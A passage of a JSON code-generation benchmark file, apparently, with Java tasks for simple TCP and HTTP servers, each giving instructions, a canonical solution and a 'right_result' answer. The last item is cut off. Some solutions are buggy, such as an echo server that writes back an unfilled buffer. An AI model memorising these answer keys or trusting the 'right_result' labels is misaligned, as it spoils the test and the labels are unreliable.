}\n\n    try {\n        s.connect(new InetSocketAddress(\"192.168.0.3\", 5678));\n    } catch (IOException e) {\n        fail(\"connect failed\");\n    }\n\n    byte[] send = \"Hello, World!\".getBytes();\n    InputStream is = s.getInputStream();\n    OutputStream os = s.getOutputStream();\n\n    try {\n        os.write(send);\n    } catch (IOException e) {\n        fail(\"exception sending on Socket\");\n    }\n\n    byte[] recv = new byte[800];\n    int recvLen = 0;\n    try {\n        recvLen = is.read(recv);\n    } catch (IOException e) {\n        fail(\"exception receiving on DatagramSocket\");\n    }\n\n    try {\n        listener.join();\n    } catch (InterruptedException e) {\n    }\n\n    try {\n        s.close();\n    } catch (IOException e) {\n        fail(\"close failed\");\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TcpEchoServerClient {\n    public static void main(String[] args) {\n        Thread serverThread = new Thread(() -> {\n            try (ServerSocket serverSocket = new ServerSocket(5678)) {\n                System.out.println(\"Server started on port 5678\");\n                Socket clientSocket = serverSocket.accept();\n                System.out.println(\"Client connected\");\n\n                InputStream input = clientSocket.getInputStream();\n                OutputStream output = clientSocket.getOutputStream();\n\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = input.read(buffer)) != -1) {\n                    output.write(buffer, 0, bytesRead);\n                }\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n                System.exit(1);\n            }\n        });\n\n        serverThread.start();\n\n        try {\n            Thread.sleep(1000); // Wait for server to start\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n            System.exit(1);\n        }\n\n        try (Socket clientSocket = new Socket(\"localhost\", 5678)) {\n            OutputStream output = clientSocket.getOutputStream();\n            InputStream input = clientSocket.getInputStream();\n\n            String testMessage = \"Hello, Server!\";\n            output.write(testMessage.getBytes());\n            output.flush();\n\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n            String echoedResponse = new String(buffer, 0, bytesRead);\n\n            if (!testMessage.equals(echoedResponse)) {\n                throw new AssertionError(\"Echoed response does not match sent message\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            System.exit(1);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 537,
    "Instruction": "Task Description: Implement a simple HTTP server class that listens for incoming client connections on a dynamically assigned port and responds with a \"Not Implemented\" HTTP status. The server should be able to handle basic client requests and clean up resources properly when closed.\n\nClass Description: The HTTPServer class implements a basic HTTP server using Java's ServerSocket. It runs in a separate thread to handle incoming connections and responds with a fixed HTTP 501 response. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- server: [ServerSocket] - The underlying ServerSocket instance that listens for incoming connections\n- thread: [Thread] - The thread in which the server runs to handle client connections asynchronously\n\nMethods:\n- HTTPServer() throws [IOException] -> [void] - Constructor that initializes the ServerSocket on a random available port and starts the server thread\n- port() -> [int] - Returns the local port number on which the server is listening\n- serve() -> [void] - Private method that handles incoming client connections and sends HTTP responses (runs in the server thread)\n- close() throws [Exception] -> [void] - Closes the server socket and waits for the server thread to terminate (implements AutoCloseable)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.nio.charset.StandardCharsets;\n\npublic class HTTPServer implements AutoCloseable {\n    private final ServerSocket server;\n    private final Thread thread;\n\n    public HTTPServer() throws IOException {\n        server = new ServerSocket(0, 1);\n        thread = new Thread(new Runnable() {\n            @Override public void run() {\n                serve();\n            }\n        });\n        thread.start();\n    }\n\n    public final int port() {\n        return server.getLocalPort();\n    }\n\n    private void serve() {\n        try {\n            Socket client = server.accept();\n\n            try (InputStream inputStream = client.getInputStream()) {\n                while (inputStream.available() > 0) {\n                    if (inputStream.read() == -1) {\n                        break;\n                    }\n                }\n\n                try (OutputStream outputStream = client.getOutputStream()) {\n                    outputStream.write(\"HTTP/1.0 501 Not Implemented\\r\\n\\r\\n\".getBytes(StandardCharsets.UTF_8));\n                }\n            }\n        }\n        catch (IOException e) {\n            if (server.isClosed() && e instanceof SocketException) {\n                return;\n            }\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override public void close() throws Exception {\n        server.close();\n        thread.join();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class HTTPServer implements AutoCloseable {\n    private ServerSocket server;\n    private Thread thread;\n\n    public HTTPServer() throws IOException {\n        this.server = new ServerSocket(0);\n        this.thread = new Thread(this::serve);\n        this.thread.start();\n    }\n\n    public int port() {\n        return this.server.getLocalPort();\n    }\n\n    private void serve() {\n        try (Socket clientSocket = this.server.accept()) {\n            OutputStream out = clientSocket.getOutputStream();\n            String response = \"HTTP/1.1 501 Not Implemented\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n            out.write(response.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void close() throws Exception {\n        this.server.close();\n        this.thread.join();\n    }\n}\n```"
  },
  {
    "Task_id": 538,
    "Instruction": "Task Description: Create a TCP server class that handles multiple client connections concurrently, processes incoming requests, and sends responses back to clients.\n\nClass Description: The ViewServer class implements a multi-threaded TCP server that listens on a specified port, accepts client connections, and processes client requests using a thread pool. Each client connection is handled by a separate worker thread.\n\nAttributes:\n- VIEW_SERVER_MAX_CONNECTIONS: [int] - Maximum number of concurrent client connections allowed\n- mServer: [ServerSocket] - Server socket instance for accepting client connections\n- mPort: [int] - Port number on which the server listens\n- mThread: [Thread] - Main server thread\n- mThreadPool: [ExecutorService] - Thread pool for handling client connections\n\nMethods:\n- ViewServer([int port]) -> [void] - Constructor that initializes the server with the specified port\n- start() -> [boolean] - Starts the server thread and thread pool, returns true if successful\n- run() -> [void] - Main server loop that accepts client connections and delegates to worker threads\n- writeValue([Socket client, String value]) -> [boolean] - Helper method to write a response to a client socket\n- ViewServerWorker([Socket client]) -> [void] - Nested class constructor for handling individual client connections\n- run() -> [void] - Worker thread method that processes client requests and sends responses",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n\n        return true;\n    }\n\n    @Override\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            return;\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            } catch (Exception e) {\n                break;\n            }\n        }\n    }\n\n    private static boolean writeValue(Socket client, String value) {\n        boolean result;\n        BufferedWriter out = null;\n        try {\n            OutputStream clientStream = client.getOutputStream();\n            out = new BufferedWriter(new OutputStreamWriter(clientStream), 8 * 1024);\n            out.write(value);\n            out.write(\"\\n\");\n            out.flush();\n            result = true;\n        } catch (Exception e) {\n            result = false;\n        } finally {\n            if (out != null) {\n                try {\n                    out.close();\n                } catch (IOException e) {\n                    result = false;\n                }\n            }\n        }\n        return result;\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        private ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        @Override\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                final String request = in.readLine();\n\n                String command;\n                String parameters;\n\n                int index = request.indexOf(' ');\n                if (index == -1) {\n                    command = request;\n                    parameters = \"\";\n                } else {\n                    command = request.substring(0, index);\n                    parameters = request.substring(index + 1);\n                }\n\n                boolean result = writeValue(mClient, \"RESPONSE\");\n            } catch (IOException e) {\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class ViewServer {\n    public static final int VIEW_SERVER_MAX_CONNECTIONS = 100;\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    public ViewServer(int port) {\n        this.mPort = port;\n        this.mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n    }\n\n    public boolean start() {\n        try {\n            this.mServer = new ServerSocket(this.mPort);\n            this.mThread = new Thread(() -> this.run());\n            this.mThread.start();\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket client = this.mServer.accept();\n                this.mThreadPool.execute(new ViewServerWorker(client));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public boolean writeValue(Socket client, String value) {\n        try (PrintWriter out = new PrintWriter(client.getOutputStream(), true)) {\n            out.println(value);\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket client;\n\n        public ViewServerWorker(Socket client) {\n            this.client = client;\n        }\n\n        public void run() {\n            try (\n                BufferedReader in = new BufferedReader(new InputStreamReader(this.client.getInputStream()));\n                PrintWriter out = new PrintWriter(this.client.getOutputStream(), true)\n            ) {\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    // Process client request here\n                    String response = \"Processed: \" + inputLine;\n                    out.println(response);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    this.client.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 541,
    "Instruction": "Task Description: Implement a TCP server in Java that handles multiple client connections concurrently using blocking I/O. The server should echo back any data received from clients after sending an initial welcome message.\n\nClass Description: EchoBioServer is a TCP server implementation that listens for incoming client connections on a specified port. For each connection, it creates a new thread to handle communication, sending a welcome message initially and then echoing back all received data.\n\nAttributes:\n- FIRST_BYTES: byte[] - The welcome message to be sent to clients upon connection\n- serverSocket: ServerSocket - The server socket listening for incoming connections\n\nMethods:\n- EchoBioServer(int port) -> void - Constructor that initializes the server socket on the specified port\n- run() -> void - Main server loop that accepts incoming connections and spawns new threads for each client\n- BioConnection(Socket socket) -> void - Nested class constructor that handles individual client connections\n- run() -> void - (In BioConnection) Handles the communication with a single client, echoing received data\n\nNested Class: BioConnection\nAttributes:\n- socket: Socket - The client socket connection\n- input: InputStream - Input stream for reading client data\n- output: OutputStream - Output stream for writing to client\n- readBuffer: byte[] - Buffer for storing received data\n- writeBuffer: byte[] - Buffer for storing data to send\n\nMethods:\n- BioConnection(Socket socket) -> void - Constructor that initializes I/O streams and buffers for a client connection\n- run() -> void - Handles the client communication loop (send welcome message, echo received data)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EchoBioServer implements Runnable {\n\n    private static final byte[] FIRST_BYTES = \"Welcome to Cobar Server.\".getBytes();\n    private final ServerSocket serverSocket;\n\n    public EchoBioServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                new Thread(new BioConnection(socket)).start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class BioConnection implements Runnable {\n        private Socket socket;\n        private InputStream input;\n        private OutputStream output;\n        private byte[] readBuffer;\n        private byte[] writeBuffer;\n\n        private BioConnection(Socket socket) throws IOException {\n            this.socket = socket;\n            this.input = socket.getInputStream();\n            this.output = socket.getOutputStream();\n            this.readBuffer = new byte[4096];\n            this.writeBuffer = new byte[4096];\n        }\n\n        @Override\n        public void run() {\n            try {\n                output.write(FIRST_BYTES);\n                output.flush();\n                while (true) {\n                    int got = input.read(readBuffer);\n                    output.write(writeBuffer, 0, got);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                if (socket != null) {\n                    try {\n                        socket.close();\n                    } catch (IOException e1) {\n                        e1.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class EchoBioServer {\n    private static final byte[] FIRST_BYTES = \"Welcome to the Echo Server!\".getBytes();\n    private ServerSocket serverSocket;\n\n    public EchoBioServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    public void run() throws IOException {\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new BioConnection(socket).start();\n        }\n    }\n\n    private class BioConnection extends Thread {\n        private Socket socket;\n        private InputStream input;\n        private OutputStream output;\n        private byte[] readBuffer = new byte[1024];\n        private byte[] writeBuffer = new byte[1024];\n\n        public BioConnection(Socket socket) throws IOException {\n            this.socket = socket;\n            input = socket.getInputStream();\n            output = socket.getOutputStream();\n        }\n\n        @Override\n        public void run() {\n            try {\n                output.write(FIRST_BYTES);\n                output.flush();\n                int bytesRead;\n                while ((bytesRead = input.read(readBuffer)) != -1) {\n                    System.arraycopy(readBuffer, 0, writeBuffer, 0, bytesRead);\n                    output.write(writeBuffer, 0, bytesRead);\n                    output.flush();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            EchoBioServer server = new EchoBioServer(12345);\n            server.run();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 543,
    "Instruction": "Task Description: Implement a TCP server that listens for incoming connections and responds with a \"PONG\" message when a client connects. The server should run in a separate thread and be able to be gracefully shut down.\n\nClass Description: PingPongSocketServer is a TCP server implementation that listens on a specified port for client connections. Upon accepting a connection, it immediately sends a \"PONG\" response and closes the connection. The server runs in a dedicated thread and supports graceful termination.\n\nAttributes:\n- thread: Thread - The thread in which the server runs\n- serverSocket: ServerSocket - The socket that listens for incoming connections\n- terminated: boolean - Flag indicating whether the server should stop running\n\nMethods:\n- initialize(int port) -> void - Initializes the server by creating a ServerSocket on the specified port and starting the server thread\n- close() -> void - Gracefully shuts down the server by closing the ServerSocket and interrupting the server thread",
    "Canonical_solution": "import tech.powerjob.common.utils.CommonUtils;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.charset.StandardCharsets;\n\npublic class PingPongSocketServer implements PingPongServer {\n\n    private Thread thread;\n    private ServerSocket serverSocket;\n    private volatile boolean terminated = false;\n\n    @Override\n    public void initialize(int port) throws Exception {\n        serverSocket = new ServerSocket(port);\n\n        thread = new Thread(() -> {\n            while (true) {\n                if (terminated) {\n                    return;\n                }\n                try (Socket socket = serverSocket.accept();\n                     OutputStream outputStream = socket.getOutputStream()) {\n\n                    socket.setSoTimeout(2000);\n                    socket.setKeepAlive(false);\n\n                    outputStream.write(PingPongUtils.PONG.getBytes(StandardCharsets.UTF_8));\n                    outputStream.write(System.lineSeparator().getBytes(StandardCharsets.UTF_8));\n                    outputStream.flush();\n                } catch (Exception e) {\n                    if (!terminated) {\n                        log.warn(\"[PingPongSocketServer] process accepted socket failed!\", e);\n                    }\n                }\n            }\n        }, \"PingPongSocketServer-Thread\");\n\n        thread.start();\n    }\n\n    @Override\n    public void close() throws IOException {\n        terminated = true;\n        CommonUtils.executeIgnoreException(() -> serverSocket.close());\n        thread.interrupt();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class PingPongSocketServer {\n    private Thread thread;\n    private ServerSocket serverSocket;\n    private volatile boolean terminated = false;\n\n    public void initialize(int port) throws IOException {\n        this.serverSocket = new ServerSocket(port);\n        this.thread = new Thread(() -> {\n            while (!terminated) {\n                try (Socket clientSocket = serverSocket.accept()) {\n                    // Send PONG response\n                    clientSocket.getOutputStream().write(\"PONG\".getBytes());\n                } catch (IOException e) {\n                    if (!terminated) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        });\n        thread.start();\n    }\n\n    public void close() {\n        terminated = true;\n        try {\n            serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        thread.interrupt();\n    }\n}\n```"
  },
  {
    "Task_id": 544,
    "Instruction": "Task Description: Create a lightweight HTTP server class that can handle incoming client connections and process requests through abstract methods that must be implemented by subclasses.\n\nClass Description: NanoHTTPD is a minimal HTTP server implementation that listens for incoming TCP connections on a specified port, handles client connections by providing input/output streams, and requires subclasses to implement the actual request processing logic.\n\nAttributes:\n- hostname: String - The hostname or IP address to bind the server to (nullable)\n- myPort: int - The port number to listen on\n- myServerSocket: ServerSocket - The server socket instance for accepting connections\n- myThread: Thread - The main listener thread for the server\n\nMethods:\n- NanoHTTPD(int port) -> void - Constructor that initializes the server with just a port number (hostname defaults to null)\n- NanoHTTPD(String hostname, int port) -> void - Constructor that initializes the server with both hostname and port\n- start() -> void - Starts the server by creating a ServerSocket and launching a daemon thread to accept connections\n- stop() -> void - Stops the server by closing the ServerSocket and joining the listener thread\n- handleConnection(InputStream inputStream, OutputStream outputStream) -> abstract void - Abstract method that must be implemented by subclasses to handle the actual client connection processing",
    "Canonical_solution": "import android.util.Log;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic abstract class NanoHTTPD {\n    private final String hostname;\n    private final int myPort;\n    private ServerSocket myServerSocket;\n    private Thread myThread;\n\n    public NanoHTTPD(int port) {\n        this(null, port);\n    }\n\n    public NanoHTTPD(String hostname, int port) {\n        this.hostname = hostname;\n        this.myPort = port;\n    }\n\n    public void start() throws IOException {\n        Log.i(\"NanoHTTPD\", \"server start\");\n        myServerSocket = new ServerSocket();\n        myServerSocket.bind((hostname != null) ? new InetSocketAddress(\n                hostname, myPort) : new InetSocketAddress(myPort));\n\n        myThread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                do {\n                    try {\n                        final Socket finalAccept = myServerSocket.accept();\n                        Log.i(\"NanoHTTPD\",\n                                \"accept request from \"\n                                        + finalAccept.getInetAddress());\n                        InputStream inputStream = finalAccept.getInputStream();\n                        OutputStream outputStream = finalAccept\n                                .getOutputStream();\n                        handleConnection(inputStream, outputStream);\n                        if (finalAccept != null) {\n                            finalAccept.close();\n                        }\n                    } catch (IOException e) {\n                    }\n                } while (!myServerSocket.isClosed());\n            }\n        });\n        myThread.setDaemon(true);\n        myThread.setName(\"NanoHttpd Main Listener\");\n        myThread.start();\n    }\n\n    public void stop() {\n        Log.i(\"NanoHTTPD\", \"server stop\");\n        try {\n            myServerSocket.close();\n            myThread.join();\n        } catch (IOException ioe) {\n            ioe.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    protected abstract void handleConnection(InputStream inputStream, OutputStream outputStream);\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\nabstract class NanoHTTPD {\n    private String hostname;\n    private int myPort;\n    private ServerSocket myServerSocket;\n    private Thread myThread;\n\n    public NanoHTTPD(int port) {\n        this(null, port);\n    }\n\n    public NanoHTTPD(String hostname, int port) {\n        this.hostname = hostname;\n        this.myPort = port;\n    }\n\n    public void start() throws IOException {\n        myServerSocket = new ServerSocket(myPort, 50, InetAddress.getByName(hostname));\n        myThread = new Thread(() -> {\n            try {\n                while (!myServerSocket.isClosed()) {\n                    Socket socket = myServerSocket.accept();\n                    handleConnection(socket.getInputStream(), socket.getOutputStream());\n                    socket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        myThread.setDaemon(true);\n        myThread.start();\n    }\n\n    public void stop() {\n        try {\n            if (myServerSocket != null) {\n                myServerSocket.close();\n            }\n            if (myThread != null) {\n                myThread.join();\n            }\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    protected abstract void handleConnection(InputStream inputStream, OutputStream outputStream) throws IOException;\n}\n```"
  },
  {
    "Task_id": 545,
    "Instruction": "Task Description: Implement a TCP server thread class that handles incoming client connections, processes commands, and manages application state through network communication.\n\nClass Description: InnerSocketThread is a Thread subclass that creates a TCP server to listen for client connections on a specified port. It processes incoming commands to control application state and respond with status information.\n\nAttributes:\n- socket: ServerSocket - The server socket instance used to listen for incoming client connections\n\nMethods:\n- run() -> void - Main thread execution method that sets up the server socket, accepts connections, processes commands, and manages resources\n- read(InputStream in) -> String - Reads data from the input stream until carriage return is encountered\n- write(OutputStream os) -> void - Writes the current application status to the output stream\n\nMethod Details:\n1. run():\n   - Input: None (uses class attributes)\n   - Output: None\n   - Description: \n     1. Creates ServerSocket on Manager.PORT\n     2. Enters infinite loop to accept client connections\n     3. Sets socket timeout to 5000ms\n     4. Reads command from client\n     5. Processes commands (START, STATUS, FLUSHMETHOD)\n     6. Sends response for STATUS command\n     7. Closes client connection\n     8. Handles exceptions and ensures proper resource cleanup\n\n2. read(InputStream in):\n   - Input: \n     - in: InputStream - The input stream from client socket\n   - Output: String - The command string read from the stream\n   - Description:\n     1. Reads bytes from buffered input stream\n     2. Converts bytes to characters\n     3. Stops reading at carriage return ('\\r')\n     4. Returns accumulated string\n\n3. write(OutputStream os):\n   - Input:\n     - os: OutputStream - The output stream to client socket\n   - Output: None\n   - Description:\n     1. Writes \"running\" or \"stop\" based on Manager's switch flag\n     2. Appends carriage return\n     3. Flushes the output stream",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic class InnerSocketThread extends Thread {\n    private ServerSocket socket;\n\n    public void run() {\n        try {\n            socket = new ServerSocket(Manager.PORT);\n            while (true) {\n                Socket child = socket.accept();\n                child.setSoTimeout(5000);\n\n                String command = read(child.getInputStream());\n\n                if (Manager.START.equals(command)) {\n                    Manager.instance().setSwitchFlag(true);\n                } else if (Manager.STATUS.equals(command)) {\n                    write(child.getOutputStream());\n                } else if (Manager.FLUSHMETHOD.equals(command)) {\n                    MethodCache.flushMethodData();\n                } else {\n                    Manager.instance().setSwitchFlag(false);\n                }\n                child.close();\n            }\n        } catch (SocketException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private String read(InputStream in) throws IOException {\n        BufferedInputStream bin = new BufferedInputStream(in);\n        StringBuffer sb = new StringBuffer();\n        int i;\n        while ((i = bin.read()) != -1) {\n            char c = (char) i;\n            if (c == '\\r') {\n                break;\n            } else {\n                sb.append(c);\n            }\n        }\n        return sb.toString();\n    }\n\n    private void write(OutputStream os) throws IOException {\n        BufferedOutputStream out = new BufferedOutputStream(os);\n        if (Manager.instance().getSwitchFlag()) {\n            out.write(\"running\".getBytes());\n        } else {\n            out.write(\"stop\".getBytes());\n        }\n        out.write('\\r');\n        out.flush();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\nclass InnerSocketThread extends Thread {\n    private ServerSocket socket;\n\n    public InnerSocketThread(int port) throws IOException {\n        this.socket = new ServerSocket(port);\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (true) {\n                Socket clientSocket = socket.accept();\n                clientSocket.setSoTimeout(5000);\n                InputStream in = clientSocket.getInputStream();\n                OutputStream out = clientSocket.getOutputStream();\n\n                String command = read(in);\n                if (\"START\".equals(command)) {\n                    // Start some process\n                } else if (\"STATUS\".equals(command)) {\n                    write(out);\n                } else if (\"FLUSHMETHOD\".equals(command)) {\n                    // Perform flush operation\n                }\n\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String read(InputStream in) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        return reader.readLine();\n    }\n\n    private void write(OutputStream os) throws IOException {\n        PrintWriter writer = new PrintWriter(os, true);\n        writer.println(\"running\");\n    }\n}\n```"
  },
  {
    "Task_id": 546,
    "Instruction": "Task Description: Create a Java class that implements a simple TCP server capable of accepting client connections and sending messages to connected clients.\n\nClass Description: The HelloServer class represents a basic TCP server that listens for incoming client connections on a specified port. Once a client connects, the server can send messages to that client through the established connection.\n\nAttributes:\n- server: [ServerSocket] - The ServerSocket instance used to listen for incoming client connections\n- client: [Socket] - The Socket instance representing the connected client\n- out: [PrintStream] - The output stream used to send messages to the connected client\n\nMethods:\n- start: [Name]([int port]) -> [void] - Starts the server on the specified port, waits for a client connection, and prepares the output stream for communication\n- sendMessage: [Name]([String message]) -> [void] - Sends the specified message to the connected client\n- stop: [Name]() -> [void] - Closes the client connection and server socket, releasing all resources",
    "Canonical_solution": "import java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class HelloServer {\n\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n\n    public void start(int port) throws Exception {\n        server = new ServerSocket(port);\n        System.out.println(\"\u670d\u52a1\u5668\u8fd0\u884c\u4e2d\uff0c\u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5\u3002\");\n        client = server.accept();\n        out = new PrintStream(client.getOutputStream());\n    }\n\n    public void sendMessage(String message) throws Exception {\n        out.println(message);\n    }\n\n    public void stop() throws Exception {\n        client.close();\n        server.close();\n        System.out.println(\"\u670d\u52a1\u5668\u5df2\u5411\u5ba2\u6237\u7aef\u53d1\u9001\u6d88\u606f\uff0c\u9000\u51fa\u3002\");\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class HelloServer {\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n\n    public void start(int port) throws IOException {\n        server = new ServerSocket(port);\n        System.out.println(\"Server started on port \" + port);\n        client = server.accept();\n        System.out.println(\"Client connected\");\n        out = new PrintStream(client.getOutputStream(), true);\n    }\n\n    public void sendMessage(String message) {\n        if (out != null) {\n            out.println(message);\n        }\n    }\n\n    public void stop() {\n        try {\n            if (out != null) out.close();\n            if (client != null) client.close();\n            if (server != null) server.close();\n            System.out.println(\"Server stopped\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        HelloServer helloServer = new HelloServer();\n        try {\n            helloServer.start(12345);\n            helloServer.sendMessage(\"Hello, Client!\");\n            Thread.sleep(5000);\n            helloServer.stop();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 547,
    "Instruction": "Task Description: Implement a TCP server class that listens for incoming client connections, processes client commands, and sends responses back. The server should run in a dedicated thread and support graceful shutdown.\n\nClass Description: SnapshotService is a TCP server implementation that listens on a specified port for client connections. It processes incoming commands from clients and responds with processed messages. The server runs in a separate thread and maintains its state through a boolean flag for controlled shutdown.\n\nAttributes:\n- port: [int] - The port number on which the server listens for incoming connections\n- serverSocket: [ServerSocket] - The server socket instance used to accept client connections\n- closed: [boolean] - Flag indicating whether the server has been shut down\n\nMethods:\n- SnapshotService(int port) -> [void] - Constructor that validates and sets the server port\n- listen() -> [void] - Starts the server by opening a socket and beginning to listen for connections\n- openSocket(int port) -> [int] - Creates a ServerSocket and starts a thread to handle client connections, returns the actual port being used\n- isIgnoredException() -> [boolean] - Checks if an exception should be ignored based on server socket state\n- process(Socket socket) -> [void] - Processes an individual client connection, reading input and sending responses\n- outputMessage(BufferedWriter outputWriter, String msg) -> [void] - Helper method to send messages to clients\n- close() -> [void] - Gracefully shuts down the server by closing the server socket",
